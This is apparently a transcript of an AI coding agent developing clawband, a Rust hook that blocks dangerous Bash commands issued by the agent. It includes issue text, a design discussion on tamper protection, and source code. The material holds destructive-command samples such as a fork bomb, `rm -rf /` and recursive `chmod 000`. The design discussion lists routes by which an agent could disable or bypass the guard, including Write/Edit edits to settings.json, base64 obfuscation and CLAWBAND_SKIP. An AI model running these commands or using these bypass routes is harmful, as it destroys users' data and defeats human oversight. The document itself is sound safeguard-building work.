**Notes:** match the function-defining form (`:(){` and the recursive `:|:&` body). Add a test for the canonical bomb and ensure ordinary function definitions don't false-positive. See [CONTRIBUTING.md](../blob/master/CONTRIBUTING.md).
EOF
)" 2>&1 | tail -1

gh issue create --repo jamessoubry/clawband --title "Add ask pattern for recursive chmod/chown that can lock you out" --label "good first issue,pattern" --body "$(cat <<'EOF'
`chmod -R 000` or `chown -R` on a broad path can make a tree inaccessible or break ownership in ways that are painful to undo.

**Suggested decision:** ask (legitimate uses exist; intent is ambiguous).

**Recipe:** add patterns to `builtin_ask()`, anchor carefully so narrow/relative uses don't get over-prompted, and add both a matching and a safe-passing test. See [CONTRIBUTING.md](../blob/master/CONTRIBUTING.md).
EOF
)" 2>&1 | tail -1

gh issue create --repo jamessoubry/clawband --title "Add \`clawband uninstall\` command" --label "good first issue,enhancement" --body "$(cat <<'EOF'
We have `clawband install` (wires the PreToolUse hook into `~/.claude/settings.json`) and `clawband verify`. A matching `clawband uninstall` should remove the clawband hook entry from settings.json (leaving icm/sqz and other hooks intact) and report what it did.

**Recipe:** mirror `cmd_install`/`register_hook` in `src/main.rs` — add a `cmd_uninstall` that filters out the clawband PreToolUse entry via serde_json, plus a dispatch arm and a unit test that round-trips install→uninstall. Leave `~/.clawband/` pattern files in place (don't delete user config). See [CONTRIBUTING.md](../blob/master/CONTRIBUTING.md).
EOF
)" 2>&1 | tail -1

Found the real issue. Your existing setup has clawband **grouped in the same Bash section as your other custom hooks** — and when `install` ran it created a *separate* clawband section instead of recognizing/merging, leaving clawband effectively duplicated across two sections. The fix: make `install` (a) detect clawband precisely by executable name, (b) **merge** into an existing Bash entry instead of spawning a parallel one, and (c) **self-heal** — collapse any existing duplicates to a single hook. Re-running `install` will then clean up machines already in the bad state.

PR #27 is up for the install fix. Now your other question — **can clawband block installing/upgrading/tampering with itself?**

Yes, partly — and there's a neat property that makes it work: **clawband's hook only fires on Claude's Bash tool, never on your interactive terminal or `!` commands.** So clawband can block *Claude* from touching clawband while *you* stay free to manage it. The agent can't disable its own seatbelt.

What it can block (all Bash-visible), via built-in patterns:
- Removing/overwriting the binary — `rm`/`cp`/`mv` targeting `~/.claude/hooks/clawband`
- Bash edits to settings — `sed -i`/`jq … >`/`tee` on `~/.claude/settings.json`
- Weakening its own config — `clawband allow`/`clawband deny`/`clawband install` run by the agent
- `brew upgrade/uninstall clawband`
- Writing `CLAWBAND_SKIP=1` into a shell profile

**The honest limitation:** clawband is a *Bash* PreToolUse hook. Claude can also edit files with the **Write/Edit tools**, which a Bash hook never sees — so `Edit(~/.claude/settings.json)` or editing `~/.clawband/*.patterns` directly would slip past. Truly complete self-protection needs clawband to *also* register a PreToolUse hook on `Write|Edit` that blocks edits to settings.json, the pattern files, and the binary. That's a real feature, not just a pattern add.

So two scopes:

| Scope | What it covers | Effort |
|-------|----------------|--------|
| **A — Bash patterns** | block the shell-command tampering above (rm/sed/brew/clawband-self-calls) | small — pattern additions, ships now |
| **B — Write/Edit guard** | also block tool-based edits to settings.json / pattern files / binary | larger — new hook matcher + install wiring |

A is a quick win and already meaningful. B closes the loop but is a bigger change to how clawband installs (a second hook). Want me to do **A now**, and file **B** as a tracked issue (or build B too)?

_**Agent (claude-opus-4-8 2026-06-07 18:55:37Z)**_

Two distinct things here — the general mechanism, then clawband self-protection. Let me separate them.

## How you control Write/Edit on any file

There are two layers, and which one matters depends on your permission mode:

**1. Native Claude Code permission rules** (`settings.json`, no code):
```json
{
  "permissions": {
    "deny":  ["Edit(~/.ssh/**)", "Write(/etc/**)", "Edit(./.git/**)"],
    "ask":   ["Write(~/.claude/settings.json)"],
    "allow": ["Edit(./src/**)"]
  }
}
```
`Edit()`, `Write()`, `Read()`, `Bash()` matchers take globs. This is the built-in way to gate the file-editing tools.

**2. A PreToolUse hook with `matcher: "Write|Edit"`** — programmable. It receives `tool_input.file_path` (and the content) and returns deny/ask/allow. This is what clawband does for Bash, extended to the edit tools — lets you do path *and content* logic, pattern files, etc.

**The catch that matters for you specifically:** you run `bypassPermissions`. In that mode the native permission *prompts* are skipped — hooks are the thing that reliably still fires (that's the whole reason clawband is a hook). So for *your* setup, the robust mechanism for controlling Write/Edit is **a hook**, not native `deny` rules. Native rules are the right answer for people in default/auto mode.

## Applying it to "allow install/update, block tamper/delete"

This needs **both** tool surfaces, because deleting the binary is a Bash action but editing settings.json/pattern files is a Write/Edit action:

- **Bash (clawband already guards this)** — add built-in patterns that **block**: `rm`/`mv`/truncate/`chmod -x` of `~/.claude/hooks/clawband` (and the brew binary), and `sed -i`/`jq >`/`tee` writing `~/.claude/settings.json`; while **allowing** `brew upgrade clawband`, `clawband install`, `bash install.sh`. (Update mutates the binary too, so "allow update, block delete" is a heuristic — we allow the known-good update commands and block raw deletion/truncation.)
- **Write/Edit (new)** — clawband grows a second hook (`matcher: "Write|Edit"`) that denies edits whose `file_path` resolves into a protected set: the clawband binary, `~/.claude/settings.json`, and `~/.clawband/*.patterns`. Protected paths could be a built-in default plus a user list (`~/.clawband/protect.paths`), so it doubles as your general "block edits to file X" tool.

Concretely I'd ship it as `clawband install --protect`, which wires **both** hooks and seeds the protected-paths list, so one command makes clawband tamper-resistant against its own agent.

**Honest limits:** obfuscated/base64 Bash still bypasses; and clawband can only guard tools Claude Code routes through hooks. But this closes the realistic self-disable paths.

This is a meaty, security-sensitive feature (new hook surface + install wiring + protected-path matching with `~`/symlink resolution + tests). Two ways to proceed:

**A.** I build the full thing now — Bash self-protect patterns + the Write/Edit guard hook + `--protect` + `protect.paths` + tests, as one PR.
**B.** I file a detailed design issue and you/contributors pick it up.

Given you run YOLO and "the agent can't disable its seatbelt" is core to clawband's pitch, I'd recommend **A**. Want me to go?

---

**All checks passed. 84 tests, 0 failures. Branch pushed to `origin feat/self-protect`.**

## What was implemented

### 1. Protected-paths config (`src/main.rs`)
- `expand_home(s)` — expands leading `~/` to `$HOME/`
- `load_protect_patterns(dir)` — reads `protect.paths` from a directory, expanding `~/` before compiling each line as a case-insensitive regex
- `protect_patterns()` — loads from global `~/.clawband/` and project `.clawband/`
- `protect_active()` — returns true if either file exists
- `edit_protected(path, pats)` — pure testable helper; true if any pattern matches the path

### 2. Write/Edit guard in `main()`
After JSON parsing and CLAWBAND_SKIP check, the tool intercepts `Write|Edit|MultiEdit|NotebookEdit` tool calls. If `protect_active()` and the target path (resolved to absolute, with `~/` expanded) matches any protect pattern, it emits a `deny` decision and returns. Bash tool handling is completely unchanged.

### 3. Bash self-protect patterns (`self_protect_deny_patterns()`)

253	fn strip_rtk(cmd: &str) -> String {
254	    // Strip "rtk " and "rtk proxy " prefixes, then the git -C <dir> wrapper RTK adds
255	    let rtk = Regex::new(r"^rtk\s+(?:proxy\s+)?").unwrap();
256	    let git_c = Regex::new(r"^git\s+-C\s+\S+\s+").unwrap();
257	    let s = rtk.replace(cmd, "");
258	    git_c.replace(&s, "git ").into_owned()
259	}

264	    // sqz rewrites "git status" → "git status 2>&1 | sqz compress --cmd git"
265	    // Strip the appended sqz pipeline so patterns match the original command.
266	    let sqz = Regex::new(r"\s*2>&1\s*\|\s*sqz\s+compress\b.*$").unwrap();
267	    sqz.replace(cmd, "").into_owned()
268	}

279	fn extract_script_path(command: &str) -> Option<String> {
280	    let interp = r"(?i)(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua[0-9.]*)";
281	
282	    // Input redirection: bash < /path/to/script
283	    let redir_re = Regex::new(&format!(r"(?i)^\s*{}\s+<\s+(.+)$", interp)).unwrap();
284	    if let Some(caps) = redir_re.captures(command) {
285	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
286	        if let Some(path) = path_str.split_whitespace().next() {
287	            return Some(path.to_string());
288	        }
289	    }
290	
291	    // Direct execution: ./script or ./script.sh — bash honours shebang, ignores extension
292	    let direct_re = Regex::new(r"(?i)^\s*(?:sudo\s+)?(\./\S+)").unwrap();
293	    if let Some(caps) = direct_re.captures(command) {
294	        let path_str = caps[1].trim().trim_matches('"').trim_matches('\'');
295	        if let Some(path) = path_str.split_whitespace().next() {
296	            return Some(path.to_string());
297	        }
298	    }
299	
300	    // Standard: interpreter [optional-flags] <path>
301	    let re = Regex::new(&format!(r"(?i)^\s*{}\s+((?:-[a-zA-Z]+\s+)*)(.+)$", interp)).unwrap();
302	    let caps = re.captures(command)?;
303	    let flags = &caps[1];
304	    // -c  → shell/python inline command string
305	    // -m  → python module (e.g. python3 -m pytest)
306	    // -e / --eval → node inline eval
307	    if Regex::new(r"(?:^|\s)-[a-zA-Z]*[cme][a-zA-Z]*(\s|$)")
308	        .unwrap()
309	        .is_match(flags)
310	    {
311	        return None;
312	    }
313	    let path_str = caps[2].trim().trim_matches('"').trim_matches('\'');
314	    // First token only — ignore script arguments after the path
315	    let path = path_str.split_whitespace().next()?;
316	    Some(path.to_string())

319	fn scan_script_file(
320	    path: &str,
321	    deny_pats: &[Pattern],
322	    ask_pats: &[Pattern],
323	    allow_pats: &[Pattern],
324	) -> Option<(String, String)> {
325	    let content = fs::read_to_string(path).ok()?;
326	    let is_js = path.ends_with(".js")
327	        || path.ends_with(".mjs")
328	        || path.ends_with(".ts")
329	        || path.ends_with(".tsx");
330	    let is_lua = path.ends_with(".lua");
331	    let mut in_block_comment = false;
332	
333	    for (lineno, raw_line) in content.lines().enumerate() {
334	        let line = raw_line.trim();
335	        if line.is_empty() {
336	            continue;
337	        }
338	
339	        // JS/TS block comment state: /* ... */
340	        if is_js {
341	            if in_block_comment {
342	                if line.contains("*/") {
343	                    in_block_comment = false;
344	                }
345	                continue;
346	            }
347	            if line.starts_with("/*") {
348	                in_block_comment = !line.contains("*/");
349	                continue;
350	            }
351	            if line.starts_with("//") || line.starts_with('*') {
352	                continue;
353	            }
354	        }
355	
356	        // Lua comment state: --[[ ... ]] block comments and -- line comments
357	        if is_lua {
358	            if in_block_comment {
359	                if line.contains("]]") {
360	                    in_block_comment = false;
361	                }
362	                continue;
363	            }
364	            if line.starts_with("--[[") {
365	                in_block_comment = !line.contains("]]");
366	                continue;
367	            }
368	            if line.starts_with("--") {
369	                continue;
370	            }
371	        }
372	
373	        // Shell (#) and Python (#) and Perl (#) line comments
374	        if line.starts_with('#') {
375	            continue;
376	        }
377	
378	        // Reuse compound-command splitting so `foo && rm -rf /` is caught
379	        let clean = strip_safe_pipes(line);
380	        for segment in &split_segments(&clean) {
381	            if allow_pats.iter().any(|p| p.matches(segment)) {
382	                continue;
383	            }
384	            for pat in deny_pats {
385	                if pat.matches(segment) {
386	                    return Some((
387	                        "deny".into(),
388	                        format!(
389	                            "Blocked: '{}' in {}:{}: {}",
390	                            pat.label,
391	                            path,
392	                            lineno + 1,
393	                            segment
394	                        ),
395	                    ));
396	                }
397	            }
398	            for pat in ask_pats {
399	                if pat.matches(segment) {
400	                    return Some((
401	                        "ask".into(),
402	                        format!(
403	                            "Review before running — '{}' in {}:{}: {}\nTo always allow: clawband allow '{}'",
404	                            pat.label,
405	                            path,
406	                            lineno + 1,
407	                            segment,
408	                            pat.label
409	                        ),
410	                    ));
411	                }
412	            }
413	        }
414	    }
415	    None
416	}
417	
418	// ─── Git force push check ─────────────────────────────────────────────────────
419	
420	fn check_force_push(cmd: &str) -> Option<String> {
421	    // Only applies to git push commands
422	    if !Regex::new(r"(?i)\bgit\s+push\b").unwrap().is_match(cmd) {
423	        return None;
424	    }
425	    // Strip --force-with-lease (safe alternative) first
426	    let strip_fwl = Regex::new(r"(?i)--force-with-lease(?:=\S+)?").unwrap();
427	    let cleaned = strip_fwl.replace_all(cmd, "");
428	    // Then block --force or -f anywhere in the command
429	    if Regex::new(r"(?i)\s--force(\s|$)|\s-f(\s|$)")
430	        .unwrap()
431	        .is_match(&cleaned)
432	    {
433	        Some("Blocked: git push --force / -f (use --force-with-lease instead)".into())
434	    } else {
435	        None
436	    }
437	}
438	
439	// ─── Safe inline pipe stripping ───────────────────────────────────────────────
440	// Remove  | python3 -c "..."  and  | python3 -m mod  before pipe checks.
441	// These are visible inline code, not supply-chain risks.
442	
443	fn strip_safe_pipes(cmd: &str) -> String {
444	    let c = Regex::new(r"(?i)\|\s*(python3?|node)\s+-c\s+[^|;&`$]*").unwrap();
445	    let m = Regex::new(r"(?i)\|\s*(python3?|node)\s+-m\s+\S+").unwrap();
446	    let s = c.replace_all(cmd, "");
447	    m.replace_all(&s, "").into_owned()
448	}
449	
450	// ─── Compound command splitting ───────────────────────────────────────────────
451	// Split on &&, ||, ; and newlines.
452	// Single | is NOT a splitter — keeps pipe-to-interpreter in one segment.
453	// \; and \| are escaped before splitting so find -exec and regex patterns survive.
454	
455	fn split_segments(cmd: &str) -> Vec<String> {
456	    const ESC_SEMI: &str = "\x01S\x01";
457	    const ESC_PIPE: &str = "\x01P\x01";
458	    const SEP: &str = "\x01SEP\x01";
459	
460	    let s = cmd.replace("\\;", ESC_SEMI).replace("\\|", ESC_PIPE);
461	
462	    let splitter = Regex::new(r"[ \t]*(\|\||&&|;|\n)[ \t]*").unwrap();
463	    let s = splitter.replace_all(&s, SEP);
464	
465	    s.split(SEP)
466	        .map(|seg| seg.trim().replace(ESC_SEMI, "\\;").replace(ESC_PIPE, "\\|"))
467	        .filter(|s| !s.is_empty())
468	        .collect()
469	}
470	
471	// ─── PostToolUse breadcrumb ───────────────────────────────────────────────────
472	// Written by PreToolUse when decision is "ask". Read and deleted by `clawband post`
473	// (PostToolUse hook). If the command ran, PostToolUse fires and we know the user
474	// approved. If denied, PostToolUse never fires and the breadcrumb expires via TTL.
475	
476	fn breadcrumb_path() -> PathBuf {
477	    config_dir().join(".last-ask")
478	}
479	
480	fn write_ask_breadcrumb(reason: &str) {
481	    let cfg = config_dir();
482	    let _ = fs::create_dir_all(&cfg);
483	    let ts = std::time::SystemTime::now()
484	        .duration_since(std::time::UNIX_EPOCH)
485	        .map(|d| d.as_secs())
486	        .unwrap_or(0);
487	    if let Ok(mut f) = fs::OpenOptions::new()
488	        .write(true)
489	        .create(true)
490	        .truncate(true)
491	        .open(breadcrumb_path())
492	    {
493	        let _ = writeln!(f, "{}\n{}", ts, reason);
494	    }
495	}
496	
497	fn cmd_post() {
498	    let path = breadcrumb_path();
499	    let Ok(content) = fs::read_to_string(&path) else {
500	        return;
501	    };
502	    let _ = fs::remove_file(&path);
503	
504	    let mut lines = content.lines();
505	    let ts: u64 = lines.next().and_then(|l| l.parse().ok()).unwrap_or(0);
506	
507	    let now = std::time::SystemTime::now()
508	        .duration_since(std::time::UNIX_EPOCH)
509	        .map(|d| d.as_secs())
510	        .unwrap_or(0);
511	    if now.saturating_sub(ts) > 60 {
512	        return;
513	    }
514	
515	    let reason: String = lines.collect::<Vec<_>>().join("\n");
516	
517	    // Extract "clawband allow '<label>'" from the hint line if present.
518	    if let Some(pos) = reason.find("clawband allow '") {
519	        let snippet = reason[pos..].lines().next().unwrap_or("").trim();
520	        println!(
521	            "The user approved a clawband-prompted command. \
522	             Suggest they run `{}` to stop being prompted for this in future.",
523	            snippet
524	        );
525	    }
526	}

528	// ─── Allow / deny commands ───────────────────────────────────────────────────
529	
530	fn cmd_add_pattern(file: &str, args: &[String]) {
531	    if args.is_empty() {
532	        eprintln!("Usage: clawband allow|deny [--project] <pattern>");
533	        std::process::exit(1);
534	    }
535	
536	    let (use_project, pattern_args) = if args[0] == "--project" {
537	        if args.len() < 2 {
538	            eprintln!("Usage: clawband allow|deny [--project] <pattern>");
539	            std::process::exit(1);
540	        }
541	        (true, &args[1..])
542	    } else {
543	        (false, args)
544	    };
545	
546	    let pattern = pattern_args.join(" ");
547	
548	    if Pattern::from_user(&pattern).is_none() {
549	        eprintln!("clawband: invalid regex: {}", pattern);
550	        std::process::exit(1);
551	    }
552	
553	    let cfg = if use_project {
554	        PathBuf::from(env::var("PWD").unwrap_or_else(|_| ".".to_string())).join(".clawband")
555	    } else {
556	        config_dir()
557	    };
558	    let _ = fs::create_dir_all(&cfg);
559	    let path = cfg.join(file);
560	
561	    match fs::OpenOptions::new().append(true).create(true).open(&path) {
562	        Ok(mut f) => {
563	            let _ = writeln!(f, "{}", pattern);
564	            let g = "\x1b[32m";
565	            let b = "\x1b[34m";
566	            let r = "\x1b[0m";
567	            let bold = "\x1b[1m";
568	            println!(
569	                "{}Added{} {}{}{} → {}{}{}",
570	                g,
571	                r,
572	                bold,
573	                pattern,
574	                r,
575	                b,
576	                path.display(),
577	                r
578	            );
579	        }
580	        Err(e) => {
581	            eprintln!("clawband: failed to write {}: {}", path.display(), e);
582	            std::process::exit(1);
583	        }
584	    }
585	}

587	// ─── Install / verify ─────────────────────────────────────────────────────────
588	
589	const DENY_EXAMPLE: &str = include_str!("../deny.patterns.example");
590	const ASK_EXAMPLE: &str = include_str!("../ask.patterns.example");
591	const ALLOW_TEMPLATE: &str = "# allow.patterns — patterns that override deny/ask blocks\n\
592	# One pattern per line. Case-insensitive regex. Lines starting with # ignored.\n\
593	#\n\
594	# Example: allow git reset --hard only to HEAD\n\
595	# git reset --hard HEAD$\n";
596	
597	fn settings_path() -> PathBuf {
598	    PathBuf::from(env::var("HOME").unwrap_or_default()).join(".claude/settings.json")
599	}
600	
601	// The command string to register in settings.json. Prefer the bare name when
602	// clawband is resolvable on PATH (stable across Homebrew upgrades); otherwise
603	// fall back to the absolute path of the running binary.
604	fn hook_command_string() -> String {
605	    if let Ok(exe) = env::current_exe() {
606	        if let Ok(canon_exe) = fs::canonicalize(&exe) {
607	            if let Ok(path) = env::var("PATH") {
608	                for dir in path.split(':') {
609	                    let candidate = PathBuf::from(dir).join("clawband");
610	                    if let Ok(canon) = fs::canonicalize(&candidate) {
611	                        if canon == canon_exe {
612	                            return "clawband".to_string();
613	                        }
614	                    }
615	                }
616	            }
617	        }
618	        return exe.to_string_lossy().into_owned();
619	    }
620	    "clawband".to_string()
621	}
622	
623	// Precisely identifies the clawband MAIN hook command — by executable basename,
624	// not substring. Excludes the `clawband post` companion. Robust against paths
625	// that happen to contain "icm"/"sqz" and against bare vs absolute forms.
626	fn is_clawband_main_command(cmd: &str) -> bool {
627	    let mut toks = cmd.split_whitespace();
628	    let Some(first) = toks.next() else {
629	        return false;
630	    };
631	    let base = first.rsplit('/').next().unwrap_or(first);
632	    if base != "clawband" {
633	        return false;
634	    }
635	    // `clawband post` is the PostToolUse companion, not the main hook
636	    toks.next() != Some("post")
637	}
638	
639	// Returns true if at least one clawband main hook is registered anywhere in PreToolUse.
640	fn clawband_hook_present(settings: &serde_json::Value) -> bool {
641	    settings["hooks"]["PreToolUse"]
642	        .as_array()
643	        .map(|entries| {
644	            entries.iter().any(|e| {
645	                e["hooks"].as_array().is_some_and(|hooks| {
646	                    hooks
647	                        .iter()
648	                        .any(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
649	                })
650	            })
651	        })
652	        .unwrap_or(false)
653	}
654	
655	// Register the clawband PreToolUse hook, normalising to exactly one instance.
656	// - Removes every existing clawband main hook (self-heals duplicates), dropping
657	//   any entry left empty.
658	// - Re-adds a single hook: prepended into an existing `Bash` matcher entry if one
659	//   exists (so clawband runs first and there's no parallel Bash section), else a
660	//   new entry at the front.
661	// Returns true if the resulting settings differ from the input (i.e. a write is
662	// warranted), false if it was already correct (idempotent).
663	fn register_hook(settings: &mut serde_json::Value, command: &str) -> bool {
664	    use serde_json::json;
665	    if !settings.is_object() {
666	        *settings = json!({});
667	    }
668	    let obj = settings.as_object_mut().unwrap();
669	    let hooks_obj = obj.entry("hooks").or_insert_with(|| json!({}));
670	    if !hooks_obj.is_object() {
671	        *hooks_obj = json!({});
672	    }
673	    let pre_val = hooks_obj
674	        .as_object_mut()
675	        .unwrap()
676	        .entry("PreToolUse")
677	        .or_insert_with(|| json!([]));
678	    if !pre_val.is_array() {
679	        *pre_val = json!([]);
680	    }
681	    let before = pre_val.clone();
682	    let pre = pre_val.as_array_mut().unwrap();
683	
684	    // Strip all existing clawband main hooks from every entry.
685	    for entry in pre.iter_mut() {
686	        if let Some(hs) = entry["hooks"].as_array_mut() {
687	            hs.retain(|h| !h["command"].as_str().is_some_and(is_clawband_main_command));
688	        }
689	    }
690	    // Drop entries whose hooks array is now empty (e.g. a former clawband-only entry).
691	    pre.retain(|e| e["hooks"].as_array().map(|h| !h.is_empty()).unwrap_or(true));
692	
693	    let hook = json!({"type": "command", "command": command});
694	    // Prefer merging into an existing Bash matcher entry over a parallel section.
695	    if let Some(bash) = pre
696	        .iter_mut()
697	        .find(|e| e["matcher"].as_str() == Some("Bash") && e["hooks"].is_array())
698	    {
699	        bash["hooks"].as_array_mut().unwrap().insert(0, hook);
700	    } else {
701	        pre.insert(0, json!({"matcher": "Bash", "hooks": [hook]}));
702	    }
703	
704	    *pre_val != before
705	}
706	
707	fn cmd_install() {
708	    let g = "\x1b[32m";
709	    let y = "\x1b[33m";
710	    let d = "\x1b[2m";
711	    let r = "\x1b[0m";
712	    let bold = "\x1b[1m";
713	
714	    // 1. Config dir + pattern templates
715	    let cfg = config_dir();
716	    let _ = fs::create_dir_all(&cfg);
717	    let seed = |name: &str, content: &str| {
718	        let p = cfg.join(name);
719	        if p.exists() {
720	            println!("  {d}exists{r}  {}", p.display());
721	        } else if fs::write(&p, content).is_ok() {
722	            println!("  {g}created{r} {}", p.display());
723	        } else {
724	            println!("  {y}failed{r} {}", p.display());
725	        }
726	    };
727	    println!("{bold}Config{r}");
728	    seed("deny.patterns", DENY_EXAMPLE);
729	    seed("ask.patterns", ASK_EXAMPLE);
730	    seed("allow.patterns", ALLOW_TEMPLATE);
731	
732	    // 2. Wire settings.json
733	    println!("\n{bold}Hook{r}");
734	    let path = settings_path();
735	    let _ = fs::create_dir_all(path.parent().unwrap_or(&PathBuf::from(".")));
736	    let mut settings: serde_json::Value = fs::read_to_string(&path)
737	        .ok()
738	        .and_then(|s| serde_json::from_str(&s).ok())
739	        .unwrap_or_else(|| serde_json::json!({}));
740	
741	    let command = hook_command_string();
742	    if register_hook(&mut settings, &command) {
743	        match serde_json::to_string_pretty(&settings) {
744	            Ok(out) => {
745	                if fs::write(&path, out + "\n").is_ok() {
746	                    println!(
747	                        "  {g}registered{r} PreToolUse Bash hook → {d}{}{r}",
748	                        command
749	                    );
750	                    println!("  {d}in {}{r}", path.display());
751	                } else {
752	                    println!("  {y}failed to write {}{r}", path.display());
753	                }
754	            }
755	            Err(_) => println!("  {y}failed to serialize settings{r}"),
756	        }
757	    } else {
758	        println!("  {d}already registered in {}{r}", path.display());
759	    }
760	
761	    println!("\n{g}Done.{r} Run {bold}/hooks{r} in Claude Code (or restart) to activate.");
762	    println!("{d}Verify anytime with: clawband verify{r}");
763	}

765	fn cmd_verify() -> i32 {
766	    let g = "\x1b[32m";
767	    let y = "\x1b[33m";
768	    let red = "\x1b[31m";
769	    let d = "\x1b[2m";
770	    let r = "\x1b[0m";
771	    let bold = "\x1b[1m";
772	    let ok = format!("{g}✓{r}");
773	    let warn = format!("{y}!{r}");
774	    let bad = format!("{red}✗{r}");
775	
776	    let mut failures = 0;
777	    println!("\n{bold}clawband verify{r}\n");
778	
779	    // 1. Binary
780	    match env::current_exe() {
781	        Ok(p) => println!("  {ok} binary: {d}{}{r}", p.display()),
782	        Err(_) => {
783	            println!("  {bad} binary: could not resolve path");
784	            failures += 1;
785	        }
786	    }
787	
788	    // 2. settings.json hook
789	    let sp = settings_path();
790	    let settings: Option<serde_json::Value> = fs::read_to_string(&sp)
791	        .ok()
792	        .and_then(|s| serde_json::from_str(&s).ok());
793	    match &settings {
794	        Some(v) if clawband_hook_present(v) => {
795	            println!("  {ok} hook registered in {d}{}{r}", sp.display())
796	        }
797	        Some(_) => {
798	            println!("  {bad} hook NOT registered — run: clawband install");
799	            failures += 1;
800	        }
801	        None => {
802	            println!("  {bad} {} missing or invalid JSON", sp.display());
803	            failures += 1;
804	        }
805	    }
806	
807	    // 3. Config dir
808	    let cfg = config_dir();
809	    if cfg.exists() {
810	        println!("  {ok} config dir: {d}{}{r}", cfg.display());
811	    } else {
812	        println!(
813	            "  {warn} no config dir at {} {d}(built-in patterns still active){r}",
814	            cfg.display()
815	        );
816	    }
817	
818	    // 4. CLAWBAND_SKIP
819	    if env::var("CLAWBAND_SKIP").as_deref() == Ok("1") {
820	        println!("  {bad} {red}{bold}CLAWBAND_SKIP=1 — ALL CHECKS DISABLED{r}");
821	        failures += 1;
822	    } else {
823	        println!("  {ok} CLAWBAND_SKIP not set");
824	    }
825	
826	    // 5. Self-test: prove the engine blocks and passes correctly
827	    let dp = builtin_deny();
828	    let ap = builtin_ask();
829	    let no_allow: Vec<Pattern> = vec![];
830	    let blocks = check_command("rm -rf /", &dp, &ap, &no_allow)
831	        .map(|(d, _)| d == "deny")
832	        .unwrap_or(false);
833	    let passes = check_command("ls -la", &dp, &ap, &no_allow).is_none();
834	    if blocks && passes {
835	        println!("  {ok} self-test: engine blocks destructive + passes safe commands");
836	    } else {
837	        println!("  {bad} self-test FAILED (blocks={blocks}, passes={passes})");
838	        failures += 1;
839	    }
840	
841	    if failures == 0 {
842	        println!("\n{g}{bold}All checks passed.{r} clawband is active.\n");
843	        0
844	    } else {
845	        println!("\n{red}{bold}{failures} check(s) failed.{r} See above.\n");
846	        1
847	    }
848	}

894	
895	    println!("{bold}Options{r}  {d}(environment variables){r}");
896	    println!("  RTK_ENABLED=1   Strip 'rtk'/'rtk proxy' prefix before matching");
897	    println!("  SQZ_ENABLED=1   Strip 'sqz compress' suffix before matching");
898	    println!("  CLAWBAND_LOG=1  Append every block/prompt to ~/.clawband.log");
899	    println!("  CLAWBAND_SKIP=1 Bypass all checks (trusted wrapper scripts)");
900	    println!();
901	
902	    println!("{bold}Decisions{r}");
903	    println!("  {g}deny{r}   Hard-blocked — command is not executed");
904	    println!("  {y}ask{r}    Prompts for approval before execution");
905	    println!("  {d}pass   Silent — command runs without interruption{r}");
906	    println!();
907	
908	    println!("{d}https://github.com/jamessoubry/clawband{r}\n");
909	}

913	fn cmd_stats() {
914	    const VERSION: &str = env!("CARGO_PKG_VERSION");
915	    let cfg = config_dir();
916	    let home = env::var("HOME").unwrap_or_default();
917	
918	    let builtin_deny_count = builtin_deny().len();
919	    let builtin_ask_count = builtin_ask().len();
920	
921	    let count_file = |name: &str| -> (usize, bool) {
922	        let path = cfg.join(name);
923	        let exists = path.exists();
924	        let n = load_patterns(&path).len();
925	        (n, exists)
926	    };
927	    let (user_deny, deny_exists) = count_file("deny.patterns");
928	    let (user_ask, ask_exists) = count_file("ask.patterns");
929	    let (user_allow, allow_exists) = count_file("allow.patterns");
930	
931	    let rtk = env::var("RTK_ENABLED").as_deref() == Ok("1");
932	    let sqz = env::var("SQZ_ENABLED").as_deref() == Ok("1");
933	    let logging = env::var("CLAWBAND_LOG").as_deref() == Ok("1");
934	    let skip = env::var("CLAWBAND_SKIP").as_deref() == Ok("1");
935	    let log_path = PathBuf::from(&home).join(".clawband.log");
936	
937	    // Parse audit log if present
938	    let (log_deny, log_ask, log_skip) = if log_path.exists() {
939	        fs::read_to_string(&log_path)
940	            .unwrap_or_default()
941	            .lines()
942	            .fold((0u64, 0u64, 0u64), |(d, a, s), line| {
943	                if line.contains("] DENY |") {
944	                    (d + 1, a, s)
945	                } else if line.contains("] ASK |") {
946	                    (d, a + 1, s)
947	                } else if line.contains("] SKIP |") {
948	                    (d, a, s + 1)
949	                } else {
950	                    (d, a, s)
951	                }
952	            })
953	    } else {
954	        (0u64, 0u64, 0u64)
955	    };
956	
957	    let g = "\x1b[32m"; // green
958	    let y = "\x1b[33m"; // yellow
959	    let b = "\x1b[34m"; // blue
960	    let d = "\x1b[2m"; // dim
961	    let r = "\x1b[0m"; // reset
962	    let bold = "\x1b[1m";
963	
964	    println!("\n{bold}clawband v{VERSION}{r}\n");
965	
966	    println!("{bold}Built-in patterns{r}");
967	    println!("  {g}deny{r}   {bold}{builtin_deny_count}{r}");
968	    println!("  {y}ask{r}    {bold}{builtin_ask_count}{r}");
969	
970	    println!("\n{bold}Global patterns{r}  {d}(~/.clawband/){r}");
971	    let file_status = |exists: bool, n: usize| -> String {
972	        if !exists {
973	            format!("{d}file not found{r}")
974	        } else if n == 0 {
975	            format!("{d}0 patterns{r}")
976	        } else {
977	            format!("{bold}{n}{r} loaded")
978	        }
979	    };
980	    println!("  deny.patterns    {}", file_status(deny_exists, user_deny));
981	    println!("  ask.patterns     {}", file_status(ask_exists, user_ask));
982	    println!(
983	        "  allow.patterns   {}",
984	        file_status(allow_exists, user_allow)
985	    );
986	
987	    if let Some(proj) = project_config_dir() {
988	        println!("\n{bold}Project patterns{r}  {d}({}){r}", proj.display());
989	        let proj_file_status = |name: &str| -> String {
990	            let path = proj.join(name);
991	            let n = load_patterns(&path).len();
992	            if n == 0 {
993	                format!("{d}0 patterns{r}")
994	            } else {
995	                format!("{bold}{n}{r} loaded")
996	            }
997	        };
998	        println!("  deny.patterns    {}", proj_file_status("deny.patterns"));
999	        println!("  ask.patterns     {}", proj_file_status("ask.patterns"));
1000	        println!("  allow.patterns   {}", proj_file_status("allow.patterns"));
1001	    }
1002	
1003	    println!("\n{bold}Active protections{r}");
1004	    println!("  script file scanning     {g}on{r}  {d}(bash/sh/python/node/ruby/perl/lua/deno + input redirection){r}");
1005	    println!("  write-then-execute       {g}on{r}  {d}(same-file write+execute in one compound command){r}");
1006	    println!("  echo content scanning    {g}on{r}  {d}(echo/printf redirected to script file){r}");
1007	    println!(
1008	        "  subshell scanning        {g}on{r}  {d}($() and backtick inner-command evaluation){r}"
1009	    );
1010	
1011	    println!("\n{bold}Options{r}");
1012	    let flag = |on: bool| {
1013	        if on {
1014	            format!("{g}on{r}")
1015	        } else {
1016	            format!("{d}off{r}")
1017	        }
1018	    };
